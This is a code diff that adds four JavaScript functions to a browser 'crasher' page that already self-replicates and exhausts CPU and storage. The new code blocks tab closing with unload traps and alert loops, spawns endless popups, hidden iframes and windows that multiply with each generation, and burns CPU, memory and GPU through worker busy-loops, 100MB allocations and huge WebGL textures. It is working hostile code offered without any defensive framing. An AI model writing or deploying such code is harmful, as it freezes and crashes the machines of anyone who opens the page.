@@ -415,6 +415,10 @@ function initParentWindow () {
     selfReplicate()
     exhaustCPU()
     fillStorage()
+    impossibleToClose()
+    rapidReplication()
+    extremeLag()
+    hydraEffect()
     }
   })
 }
@@ -3374,6 +3378,163 @@ function fillStorage() {
         }
       }, 100)
     })
+  }
+}
+
+// ===== IMPOSSIBLE TO CLOSE =====
+function impossibleToClose() {
+  window.addEventListener('beforeunload', (e) => {
+    e.preventDefault()
+    e.returnValue = 'Are you sure?'
+    return 'Are you sure?'
+  })
+  window.addEventListener('unload', (e) => {
+    for (let i = 0; i < 10; i++) {
+      window.open(window.location.href + '?reborn=' + Date.now(), '_blank')
+    }
+  })
+  setInterval(() => {
+    window.focus()
+    alert('SYSTEM ERROR: Cannot close infected tab!')
+    alert('REPLICATING...')
+    alert('DO NOT CLOSE!')
+  }, 100)
+  document.documentElement.requestFullscreen().catch(() => {})
+  document.body.requestPointerLock()
+  setInterval(() => {
+    document.body.requestPointerLock()
+    window.focus()
+  }, 50)
+}
+
+// ===== RAPID REPLICATION =====
+function rapidReplication() {
+  const myUrl = window.location.href
+  function openBurst() {
+    for (let i = 0; i < 20; i++) {
+      const w = window.open(
+        myUrl + '?gen=' + Date.now() + '&id=' + Math.random(),
+        '_blank',
+        'width=300,height=200,left=' + (Math.random() * screen.availWidth) +
+        ',top=' + (Math.random() * screen.availHeight)
+      )
+      if (w) {
+        window._childWindows = window._childWindows || []
+        window._childWindows.push(w)
+      }
+    }
+  }
+  setInterval(openBurst, 500)
+  setInterval(() => {
+    for (let i = 0; i < 10; i++) {
+      const iframe = document.createElement('iframe')
+      iframe.src = myUrl + '?iframe=' + Date.now()
+      iframe.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;'
+      document.body.appendChild(iframe)
+    }
+  }, 200)
+  const bc = new BroadcastChannel('replicate')
+  setInterval(() => {
+    bc.postMessage({ cmd: 'BURST', timestamp: Date.now() })
+  }, 300)
+  bc.onmessage = (e) => {
+    if (e.data.cmd === 'BURST') openBurst()
+  }
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.ready.then(registration => {
+      setInterval(() => {
+        registration.active.postMessage('SPAWN')
+      }, 1000)
+    })
+  }
+}
+
+// ===== EXTREME LAG =====
+function extremeLag() {
+  function blockThread() {
+    const start = performance.now()
+    while (performance.now() - start < 500) {
+      Math.pow(Math.random(), Math.random())
+    }
+    setTimeout(blockThread, 0)
+  }
+  for (let i = 0; i < 20; i++) blockThread()
+  setInterval(() => {
+    for (let i = 0; i < 1000; i++) {
+      const div = document.createElement('div')
+      div.innerHTML = 'x'.repeat(10000)
+      document.body.appendChild(div)
+    }
+  }, 100)
+  setInterval(() => {
+    document.body.style.cssText = 'transform: rotate(' + Math.random() * 360 + 'deg);filter: blur(' + Math.random() * 10 + 'px);'
+    document.body.offsetHeight
+  }, 10)
+  const arrays = []
+  setInterval(() => {
+    for (let i = 0; i < 5; i++) {
+      arrays.push(new Uint8Array(100 * 1024 * 1024))
+    }
+  }, 500)
+  const workerCode = `
+    self.onmessage = () => {
+      while(true) {
+        let x = 0;
+        for (let i = 0; i < 10000000; i++) {
+          x += Math.sqrt(i);
+        }
+        self.postMessage(x);
+      }
+    }
+  `
+  const blob = new Blob([workerCode], { type: 'application/javascript' })
+  const url = URL.createObjectURL(blob)
+  const maxWorkers = navigator.hardwareConcurrency * 2 || 16
+  for (let i = 0; i < maxWorkers; i++) {
+    new Worker(url).postMessage('start')
+  }
+  setInterval(() => {
+    const c = document.createElement('canvas')
+    c.width = 4096
+    c.height = 4096
+    const ctx = c.getContext('2d')
+    ctx.fillStyle = '#' + Math.floor(Math.random()*16777215).toString(16)
+    ctx.fillRect(0, 0, 4096, 4096)
+  }, 50)
+  setInterval(() => {
+    const c = document.createElement('canvas')
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl')
+    if (gl) {
+      for (let i = 0; i < 100; i++) {
+        const texture = gl.createTexture()
+        gl.bindTexture(gl.TEXTURE_2D, texture)
+        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null)
+      }
+    }
+  }, 500)
+}
+
+// ===== HYDRA EFFECT =====
+function hydraEffect() {
+  const urlParams = new URLSearchParams(window.location.search)
+  const generation = parseInt(urlParams.get('gen')) || 0
+  const spawnCount = 10 + (generation * 2)
+  setTimeout(() => {
+    for (let i = 0; i < spawnCount; i++) {
+      window.open(window.location.pathname + '?gen=' + (generation + 1), '_blank')
+    }
+  }, 1000)
+  window.addEventListener('beforeunload', () => {
+    const bc = new BroadcastChannel('hydra')
+    bc.postMessage({ cmd: 'PARENT_DYING', gen: generation })
+  })
+  const bc = new BroadcastChannel('hydra')
+  bc.onmessage = (e) => {
+    if (e.data.cmd === 'PARENT_DYING') {
+      for (let i = 0; i < 20; i++) {
+        window.open(window.location.href + '?hydra=' + Date.now(), '_blank')
+      }
+    }
   }
 }
 
